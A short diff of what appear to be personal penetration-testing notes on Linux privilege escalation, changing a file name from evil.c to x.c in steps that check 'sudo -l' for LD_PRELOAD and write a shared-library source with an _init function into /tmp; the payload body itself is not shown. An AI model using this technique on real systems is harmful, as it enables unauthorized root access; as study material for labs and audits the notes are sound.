@@ -121,7 +121,7 @@ Look for any version and google CVEs<br>
 Sudo -l look for LD_PRELOAD at the top (pre loads a library) (might say env_keep+=LD_PRELOAD)<br>
 user may need to be in sudo file <br>
 now browse to the /tmp directory <br>
-Create a file <br>
+Create a file named x.c<br>
 #include <stdio.h><br>
 #include <sys/types.h><br>
 #include <stdlib.h><br>
@@ -133,7 +133,7 @@ void _init() {<br>
 }<br>
 <br>
 May need to do it with cat if not working<br>
-cat << EOF >> evil.c<br>
+cat << EOF >> x.c<br>
 > #include <stdio.h><br>
 > #include <sys/types.h><br>
 > #include <stdlib.h><br>
